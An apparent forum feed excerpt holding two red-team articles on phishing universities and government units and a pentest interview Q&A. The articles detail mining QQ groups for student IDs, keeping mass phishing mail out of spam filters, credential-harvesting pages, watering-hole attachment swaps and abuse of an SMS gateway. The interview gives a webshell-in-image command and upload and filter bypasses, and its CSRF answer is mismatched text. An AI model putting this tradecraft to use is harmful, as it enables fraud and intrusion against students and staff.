&lt;li&gt;如对奖励有任何异议或疑问，请及时联系&lt;strong&gt;火线小助手&lt;/strong&gt;。&lt;/li&gt;&lt;/ul&gt;

&lt;h3&gt;内容征集及奖励方案详情&lt;/h3&gt;

&lt;p&gt;我们诚邀更多的技术专家加入火线Zone社区，共同构建技术安全生态。更多内容征集及奖励方案详情请访问：&lt;a href=&quot;https://zone.huoxian.cn/d/2891-zone-24&quot; rel=&quot;ugc noopener&quot; target=&quot;_self&quot;&gt;火线Zone社区规则升级，共建技术安全生态&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;结语&lt;/h3&gt;

&lt;p&gt;火线Zone社区对每一位创作者的辛勤工作和贡献表示最深的敬意。我们期待在未来的日子里，继续与您携手合作，共同书写技术安全的新篇章。&lt;/p&gt;

&lt;p&gt;再次感谢所有支持火线Zone的朋友们！&lt;/p&gt;

&lt;p&gt;火线Zone社区团队&lt;br&gt;
2025年1月&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;版权声明： 本文内容由火线Zone社区原创发布，未经允许，不得转载或用于商业用途。如需转载，请遵守转载说明中的相关规定。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2966-zone-241112</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2966-zone-241112</guid><pubDate>Mon, 06 Jan 2025 08:16:50 GMT</pubDate><author>小火子</author><category>官方公告</category></item><item><title>谈一谈红队钓鱼中的姿势（中）</title><description>&lt;h4&gt;前言&lt;/h4&gt;

&lt;p&gt;这篇主要接上篇，当然配合红队实战中的案例来说明，接上篇的钓鱼。主这篇文章主要以JY和ZW行业来选择钓鱼姿势。&lt;/p&gt;

&lt;h3&gt;JY行业&lt;/h3&gt;

&lt;p&gt;JY行业有JY专线，所以选择JYJ或者JYT为靶标的时候可以尝试从EDU入手，为什么不考虑小中高的原因是因为第一资产少，大部分学校在公网上的业务主要都是一堆静态的HTML还是前后台分离的，并且大部分业务都在公有云上，运气好的话可以突破边界进入某个学校的内网却根本摸不到厅，纯纯浪费精力，性价比太低。所以在选择靶标尽可能选择EDU，并且在稍微级别高一点儿的红队活动中，有JYT就一定EDU，所以在选择通过EDU突破JY专网到厅里还是可以选择迂回的，就算EDU靶标不是自己的靶标，没出局的靶标后期一般会放开，成果不一致后期基本上也可以提交，性价比挺高的。&lt;/p&gt;

&lt;p&gt;选择EDU钓鱼的话可以优先选择有VPN的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140302-882807-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;比如&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140321-28488-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;一般大学都会有vpn，可以从VPN类型看出一个学校VPN面向的对象。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;有专有VPN客户端或者商用VPN产品的一般对象基本会面向全校师生。这个时候选择钓鱼的对象会比较大且成功率高。&lt;/li&gt;
&lt;li&gt;如果是SSLVPN的基本上限制会比较大，比如说入网用户一般都伴随申请等，这个时候面向的对象会使小部分群体，就vpn来讲钓鱼的成功率很低。（图片资产测绘检索的）&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;[upl-image-preview url=&lt;a href=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140341-967615-image.png&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140341-967615-image.png&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;不过费劲巴拉的一波钓鱼，会出现两种情况&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;VPN登录进入了，但是没有资源分配，事实上大部分高校的资源（我遇见的）基本上给的资源都只有&lt;strong&gt;图书馆+教务系统&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140357-643444-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;运气比较好，运维安全意识比较低的资源会给&lt;strong&gt;ALL&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;

&lt;h5&gt;JY行业的网络状况&lt;/h5&gt;

&lt;p&gt;我目前遇见的JY的高校重要核心业务的网络情况基本上都是可以出网的，没有碰见不出网的情况，所以基本上不用考虑机器拿下了死活不出网，如果存在这种现象，基本上不需要怀疑其他的，只需要怀疑是不是自己的服务器被打标签之类的，因为目前一些设备的&lt;strong&gt;阻断是基于情报&lt;/strong&gt;，各大厂商的服务器都是有一次更换公网地址的机会的，不过现在的状况是就算换了ip也可能依旧被打标签。&lt;/p&gt;

&lt;h4&gt;信息搜集关键点&lt;/h4&gt;

&lt;ul&gt;&lt;li&gt;信息搜集从&lt;strong&gt;QQ群来、二手闲置交易群&lt;/strong&gt;来效率最高。尤其在用学号等，不过建议搭配社工Ku使用，手机号等结合使用效果会更好。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140382-654658-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这里可利用群进行精准钓鱼，最好的选择是新生群，避免学生离校实习等情况，容易打偏。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736141870-101754-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;一般高校的VPN绑定都是学号，配合用户的口令复用即可突破边界&lt;/li&gt;
&lt;li&gt;高校小小程序和定制化开发的app，这里需要注意的是部分高校的app绑定的是手机号而不是学号，使用web端的口令和密码是无法进行登录的。这里的信息搜集仅针对部分高校的部分应用有效&lt;/li&gt;
&lt;li&gt;不要忽略高校表白墙+新生群，这里是可以确定所谓的校园宽带是不是真正的”校园网“，因为确实发现部分学校的校园网比较假，是运营商的网络，跟学校内网业务是真正意义上的两张网&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736140399-174841-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;事实上你可以永远相信一个高校的万能墙和表白墙。&lt;/p&gt;

&lt;h4&gt;权限维持&lt;/h4&gt;

&lt;p&gt;对于钓鱼高校用户成功率可以说是最高的，但是尤其需要注意的有两点&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;手速要快，权限维持要尽快做好，包括定时任务。因为高校用户的终端太容易关机了。在没有获取稳定的隧道的条件下，手速一定要快，这样才能实现可持续。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736141908-519116-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;确定好内网业务段，所以密码抓取的速度要快，浏览器的历史记录以及存储的账号密码是实现进一步攻击的有效保障。&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736141920-204945-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h4&gt;横向&lt;/h4&gt;

&lt;p&gt;针对于高校来讲，用户的体量比较大，之前跟多个高校的网络中心其实是有过交流的，对于高校来说，探针以及联动策略不可能做的很精细化，容易影响业务，另外针对用户的ip地址是不会IP和MAC绑定的，校园网顶多可以精确到学号手机号，阻断封禁时间也是比较短的，所以钓鱼获取到机器后直接一把梭就ok，不用担心溯源的问题，毕竟溯源的难度大周期性长。当然获取内网服务器后横向还是要注意规避流量探针的。&lt;/p&gt;

&lt;p&gt;内网获取业务系统的权限可以注意配合使用&lt;strong&gt;水坑攻击&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143460-301763-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这是在一次行动中获取的答题系统，通过某个漏洞获取了系统的权限，通过CS上线后进行水坑攻击，修改服务器中的&lt;strong&gt;附件&lt;/strong&gt;，进行钓鱼。这种利用水坑横向钓鱼更加精准，并且降低了上钩即被发现的风险。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143471-301897-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h4&gt;邮箱钓鱼选择&lt;/h4&gt;

&lt;p&gt;我目前钓鱼的话基本上是会选择两种邮箱，注意配合使用上一篇提到的签名&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;网易邮箱&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;QQ和网易邮箱，群收件人能看到其它收件人&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143484-47346-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;QQ邮箱&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-01-06/1736143496-130783-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;（2024年底测试）&lt;/strong&gt;QQ邮箱进行批量发送，邮件在60封左右的时候，邮件已进垃圾邮件，但是网易进行发送的时候，批量发送，一次发送80封的时候邮件还没有进入&lt;strong&gt;垃圾邮件&lt;/strong&gt;。所以在发送钓鱼的时候注意，单次单发，且不同的用户尽可能发送不一致的内容以及不同哈希的附件，这样成功率稍高一点儿。&lt;/p&gt;

&lt;h3&gt;ZW行业&lt;/h3&gt;

&lt;p&gt;其实ZW基本上没啥说的，钓鱼成功的概率太低，主要原因有两点&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;ZW不出网&lt;/li&gt;
&lt;li&gt;国产化现在太高了，基本上大一点儿的单位国产化概率有百分之八九十&lt;/li&gt;&lt;/ul&gt;

&lt;h5&gt;突破口&lt;/h5&gt;

&lt;p&gt;所以现在基本上针对ZW的钓鱼基本上Tricks有一个个&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;目标转向二三级单位，进内网容易且钓鱼成功率高&lt;/li&gt;&lt;/ul&gt;

&lt;h5&gt;风险&lt;/h5&gt;

&lt;p&gt;不是说二三级单位出网，而是二三级单位的网络规划以及管理相对来说比较薄弱，且二三级单位的国产化没那么高，有的甚至没有，从这一点儿迂回横向很好使，但是风险是容易找不到从二三级到一级单位的链路。&lt;/p&gt;

</description><link>https://zone.huoxian.cn/d/2965</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2965</guid><pubDate>Mon, 06 Jan 2025 06:05:25 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>谈一谈红队中的社工钓鱼姿势(上)</title><description>&lt;h4&gt;前言&lt;/h4&gt;

&lt;p&gt;红队越来越难打了，起码对我来说今年的几场红队中社工钓鱼成为了必定要考虑的姿势，现在的目标也不是完全能拿有效RCE的day拿下的，当然比有巨多0day的大佬来说还真比不上。大厂的安全研究部门以及厂商的公益src从day的产出上来说，拎出来太能打了。并且这两年也没有非常核弹级的nday，已经不上前些年拿着shiro一键利用工具梭哈就能解决靶标的年代了。所以起码在目前阶段而言甚至明年或者后年的红队同学们来讲，钓鱼的姿势可能在一定程度上能决定在一场比赛中能拿到什么样的名次。&lt;/p&gt;

&lt;h4&gt;钓鱼&lt;/h4&gt;

&lt;p&gt;选择社工钓鱼的方式基本上考虑几点&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;钓鱼的优势&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;钓鱼的成果最大化的好处是能实现突破边界以及快速的获取办公网、业务网的大致情况以及部分业务系统的web权限，毕竟目前人的习惯上来讲&lt;strong&gt;浏览器记住密码&lt;/strong&gt;这个习惯不可能改掉，毕竟太好使了。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;为什么选择钓鱼&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;口令复用的问题，举个简单的例子，对于大多数人来讲，不管工商银行还是说中国银行等等，取款密码大部分人的习惯是一致的，QQ密码还是微信密码对于同一个人来说服用的概率也很高。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;钓鱼方式方法&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;邮件钓鱼：攻击者发送伪装成信任来源（如银行、社交网站、电子商务网站等）的电子邮件给受害者，欺骗受害者点击链接或下载附件，并在其中输入个人敏感信息。&lt;/p&gt;

&lt;p&gt;目前常用的方式有&lt;/p&gt;

&lt;p&gt;社交媒体钓鱼：攻击者在社交媒体平台上伪装成真实账户或虚假人物，与受害者进行互动并引导受害者访问恶意站点或提供个人信息。&lt;/p&gt;

&lt;p&gt;手机钓鱼：攻击者通过短信或电话，欺骗受害者前往恶意站点或者提供个人信息。&lt;/p&gt;

&lt;h4&gt;近源&lt;/h4&gt;

&lt;p&gt;badUSB投放：攻击者通过近源利用U盘等可移动设备，将病毒或木马程序隐藏在其中，并将其留在可能被特定目标（如公司）发现的地方，以便感染目标计算机系统。&lt;/p&gt;

&lt;p&gt;WIFI破解：攻击者利用近源方式目标单位的无线网络进行探测以及尝试破解，当WIFI未和业务网进行隔离时，可直接突破边界进行横向。&lt;/p&gt;

&lt;p&gt;启动盘近源终端：攻击者通过近源的方法接近目标单位的终端，通过启动盘增加管理员用户，实现突破边界，进行横向攻击。同时可以通过抓取管理员用户的密码横向进行密码喷洒。&lt;/p&gt;

&lt;h4&gt;实例&lt;/h4&gt;

&lt;p&gt;只讲方式方法，不谈免杀，除去近源的方式外，基本上所有的钓鱼和社工方式均需要免杀的参与。暂且不提横向工具的免杀，上线应用的免杀是进行钓鱼前首要需要解决的问题。&lt;/p&gt;

&lt;h4&gt;实战钓鱼一：邮箱钓鱼&lt;/h4&gt;

&lt;p&gt;场景：靶标学校&lt;/p&gt;

&lt;p&gt;对于学校的钓鱼比较简单，最先考虑的问题应该是学号等。学校的业务系统涉及第二学科、教务等系统。但需考虑的首要问题是，账号怎么获得。方式有两种&lt;/p&gt;

&lt;p&gt;1.通过邮箱钓鱼，以QQ邮箱为例，需要注意以下几个方面&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;&lt;p&gt;注册qq邮箱后需要将被绑定的手机号删除掉。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;开启英文邮箱&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615527-996347-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;修改邮箱发送为英文邮箱，最好使用信息搜集的靶标的相关用户的姓名全拼等&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615548-991550-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;&lt;p&gt;增加qq邮箱的&lt;strong&gt;资料卡&lt;/strong&gt;或者设置签名&lt;br&gt;
&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615559-687045-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

  &lt;p&gt;这里修改资料卡会更快，同样也可以尝试添加个性签名&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615572-76354-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

  &lt;p&gt;发送邮件的时候需要附加签名&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615585-766214-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

  &lt;p&gt;但是需要注意的是，qq账号的头像需要更换你想要表达的头像，比如说目标单位的logo等，文案的话可以选择自己考虑，但是这里开始钓鱼的话分为两类，第一类恶意应用钓鱼，第二类账号密码钓鱼&lt;/p&gt;

  &lt;h5&gt;账号密码钓鱼&lt;/h5&gt;

  &lt;p&gt;这里导航的钓鱼超链要到位，这种钓鱼考虑到方便目标点击跳转，也方便无复制点击调转实现钓鱼，钓鱼网站的制作的话需要发件人自己测试好，当首次提交后自动跳转正确的网址。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615606-232216-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

  &lt;p&gt;整个钓鱼效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615617-669061-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

  &lt;p&gt;这里做好数据接收机制，可以考虑使用钉钉的机器人接口，但是需要注意，钉钉机器人的接口一分钟调用次数为20次，&lt;strong&gt;存在丢包的情况&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615629-405796-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;需要注意的是现在腾讯的机制是同一个账号给陌生人发邮件，当发送条数一次大于30条左右就会邮件自动进入黑名单，在22年之前，一次能100封左右，这是这两年在实际利用QQ邮箱发送钓鱼邮件的时候发现的。&lt;/p&gt;

&lt;p&gt;下面是我在近年实战钓鱼的实例&lt;/p&gt;

&lt;p&gt;这个案例是钓鱼利用通用密码登录员工企业邮箱进行钓鱼邮件批量下发。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615782-783970-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;批量下发文件后上线效果，总共是上线终端98台。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615793-590595-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;但是客户端上线手速一定要快，做好权限维持才是可持续输出的先决条件。&lt;/p&gt;

&lt;h4&gt;实战钓鱼二：系统任务下发&lt;/h4&gt;

&lt;p&gt;获取web应用系统权限，通过系统的文件管理下发邮件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615811-214672-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;下发的图片找不到了，系统文件管理下发的功能基本上综合系统或者sso都有。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615821-968882-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;上线效果也是很能打。&lt;/p&gt;

&lt;p&gt;Tips:注意政务的话就不要考虑一级单位了，毕竟现在&lt;strong&gt;国产化&lt;/strong&gt;比例太高了，性价比来说太不划算了。&lt;/p&gt;

&lt;h4&gt;实战钓鱼三：利用系统短信接口&lt;/h4&gt;

&lt;p&gt;这是某个行动中的某个靶标单位，系统内的短信接口很好用，这里的短信接口不单单可以发送给本单位人员，包括到访单位的数十万人员均可发送，因为是YL行业，所以就影响来说不亚于前端时间某JYT发送非法链接。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615839-95930-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;在活动中我们选择目标群体有两类。&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;该单位所有人员&lt;/li&gt;
&lt;li&gt;社区YY人员（社区为重点）一张网且防护弱&lt;/li&gt;
&lt;li&gt;发送内容需要考量&lt;/li&gt;&lt;/ul&gt;

&lt;p&gt;效果如下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615858-888903-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这个截图为自己手机号添加进去测试接受消息的效果，最终也是获取了几十台的机器，官方发的消息可信度能不高吗？&lt;/p&gt;

&lt;h4&gt;传统社工&lt;/h4&gt;

&lt;p&gt;传统社工其实更简单，但是成功率比较低。下面的两个案例是根据获取到的信息被VX钓鱼的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615891-745963-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;突破的专有云。&lt;/p&gt;

&lt;p&gt;案例二为上次项目中利用微信钓鱼，短平快，上马没用，最后上的向日葵&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615903-325034-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2024-12-31/1735615913-762882-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;效果属于说是最好的，但是要根据行业而定，比如说这个案例中的为YL行业，大多数的网络状况就是双网卡机器少。&lt;/p&gt;

&lt;h4&gt;小结&lt;/h4&gt;

&lt;p&gt;找过去的报告比较难找图片，有机会下一篇分享不行同业、不同场景的钓鱼姿势，年底咯，没想到HVV项目竟然不同于往年竟然又多起来了。&lt;/p&gt;

</description><link>https://zone.huoxian.cn/d/2964</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2964</guid><pubDate>Tue, 31 Dec 2024 03:32:12 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>redteam</category></item><item><title>分享最近一次渗透测试岗位面试经验</title><description>&lt;h3&gt;0x1 前言&lt;/h3&gt;
&lt;p&gt;下面呢主要是给师傅们分享自己一、二面面试的经验和面试题，以文字的形式给大家展示一下（可能有些地方描述和解答的不是很正确，希望大佬们勿喷！）&lt;br&gt;
通过邮箱联系，然后安排时间腾讯会议面试&lt;br&gt;
目前到二面了，从投递简历到一面过了差不多10天左右，然后开始的一面，一面主要是某科技的安服工程师和那边的一个项目经理一起面试我。&lt;br&gt;
面试开始那边也是直接先介绍了下他们自己，然后再让我自我介绍下，我也就提前准备的面经，然后进行面试前的一个熟练背，再加上自己的一些随机发挥，看面试官他们问什么然后自我介绍再适当的回答（这里给师傅们点建议，得学会自我介绍的时候吹牛逼），然后就是吧啦吧啦的介绍了，也没什么特别需要给师傅们分享的了。&lt;/p&gt;


&lt;h3&gt;0x2 一面面试官的问题&lt;/h3&gt;

&lt;h4&gt;1、面试官开始就问了我，为什么要学网络安全？&lt;/h4&gt;
&lt;p&gt;这里我就不给师傅们回答了，这个看自己的发挥了（尽量显的自己特别热爱安全，把安全当成自己的一个兴趣）&lt;br&gt;
后面我就开始给师傅们介绍下面试的问题吧，然后最后面我也会给师傅们一些面试的经验，然后从投递简历到面试再到面试通过选择去哪家公司的一个建议（大佬勿喷）&lt;/p&gt;


&lt;h4&gt;2、什么是sql注⼊&lt;/h4&gt;
&lt;p&gt;攻击者通过在输⼊的SQL查询中注⼊恶意代码，来执⾏他们想要的操作，⽐如获取敏感信息、删除或篡改数据&lt;br&gt;
等。这种攻击通常发⽣在⽤户输⼊没有经过充分验证和清理的情况下，例如在⽹站的登录表单或搜索框中输⼊&lt;br&gt;
SQL语句。为了防⽌SQL注⼊，开发者应该使⽤参数化查询和预编译的查询，对⽤户的输⼊进⾏严格的验证和清&lt;br&gt;
理。&lt;/p&gt;


&lt;h4&gt;3、关于sql注⼊，都分为那些？&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;有回显和⽆回显&lt;/li&gt;
&lt;li&gt;⽆回显称为盲注，包括布尔盲注或者dnslog外带来探测&lt;/li&gt;
&lt;li&gt;有回显可以union联合查询、报错注⼊、宽字节注⼊、堆叠注⼊、⼆次注⼊&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;4、如果在实战中遇到了防护，⽐如sql注⼊过滤掉了空格怎么办？&lt;/h4&gt;
&lt;p&gt;将空格URL编码，例如%20 %0a&lt;/p&gt;


&lt;h4&gt;5、什么是csrf？&lt;/h4&gt;
&lt;p&gt;tomcat⽇志默认路径：在安装⽬录下的logs⽂件夹下&lt;br&gt;
apache /etc/httpd/conf/httpd.conf&lt;br&gt;
nginx的⽇志主要分为access.log、error.log两种，可通过查看nginx.conf⽂件来查找相关⽇志路径&lt;/p&gt;


&lt;h4&gt;6、简单讲解下内存⻢？&lt;/h4&gt;
&lt;p&gt;tomcat的servletAPI型内存⻢为例&lt;br&gt;
创建了⼀个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加&lt;br&gt;
到StandardContext的children当中，最后添加ServletMapping将访问的URL和wrapper进⾏绑定。&lt;/p&gt;


&lt;h4&gt;7、讲下内存⻢排查思路？&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;首先判断是什么方式注入的内存马&lt;/li&gt;
&lt;li&gt;可以通过查看&lt;strong&gt;web日志&lt;/strong&gt;，以及看是否有类似&lt;strong&gt;哥斯拉、冰蝎的流量特征&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如果web日志中没有发现，那么我们就可以排查&lt;strong&gt;中间件的error.log日志&lt;/strong&gt;&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;8、平常有对APP、小程序渗透测试嘛？&lt;/h4&gt;
&lt;p&gt;有的&lt;/p&gt;


&lt;h4&gt;9、你是用什么工具对app进行抓包？&lt;/h4&gt;
&lt;p&gt;我是使用的雷电模拟器然后使用burpsuit配合进行抓取app数据包的&lt;/p&gt;


&lt;h4&gt;10、针对apache的⽂件上传，可以使⽤什么？&lt;/h4&gt;
&lt;p&gt;上传.htaccess&lt;br&gt;
apache解析漏洞，如果上传.htaccess，那么当前⽬录就会按照htaccess中的配置执⾏&lt;/p&gt;


&lt;h4&gt;11、关于图⽚⻢的制作你知道那些⽅法？&lt;/h4&gt;
&lt;p&gt;命令⾏⽅式：copy 1.png/b+1.php/a 2.png&lt;br&gt;
在⽂件头中加⼊GIF98a&lt;br&gt;
BurpSuite抓包修改图⽚body&lt;br&gt;
打开图⽚⽂件属性，在详细信息那⾥写⼊⼀句话&lt;/p&gt;



&lt;h4&gt;12、蚁剑和冰蝎的区别?&lt;/h4&gt;
&lt;p&gt;冰蝎的流量进⾏了aes加密，相对于蚁剑更加难以被检测，webshell免杀性好。冰蝎更新了4.0更加安全和易注⼊。&lt;/p&gt;


&lt;h4&gt;13、平常有挖企业src嘛？可以说说你的资产收集过程嘛？&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;1、首先确定我们要挖的公司资产&lt;/li&gt;
&lt;li&gt;2、使用wps，新建一个exec表格，里面新建好几个表格，备注比如：根域名、子域名、小程序、app以及漏洞提交进度等情况&lt;/li&gt;
&lt;li&gt;3、上爱企查看这个企业的知识产权，然后看网站备案，然后看这个公司的股权穿透图，这里有一个找边缘资产的好方法，就是看股权穿透图找下面的子公司，但是不同的企业src收录标准不一&lt;/li&gt;
&lt;li&gt;4、使用小蓝本查该公司的一个小程序、app，然后保存在exec表格里面&lt;/li&gt;
&lt;li&gt;5、使用oneforall工具进行子域名挖掘，然后保存到一个txt里面，再使用灯塔进行子域名挖掘，再汇总，然后使用无影工具里面的辅助模块进行资产分类&lt;/li&gt;
&lt;li&gt;6、使用灯塔ARL自动化跑，去找一些文件泄露的漏洞&lt;/li&gt;&lt;/ul&gt;


&lt;h4&gt;14、有自己的技术博客嘛，在先知、freebuf等平台发表过文章嘛？&lt;/h4&gt;
&lt;p&gt;都有，自己一直有保持写技术博文的习惯&lt;/p&gt;


&lt;h4&gt;15、关于代码审计你知道那些，说说看？&lt;/h4&gt;
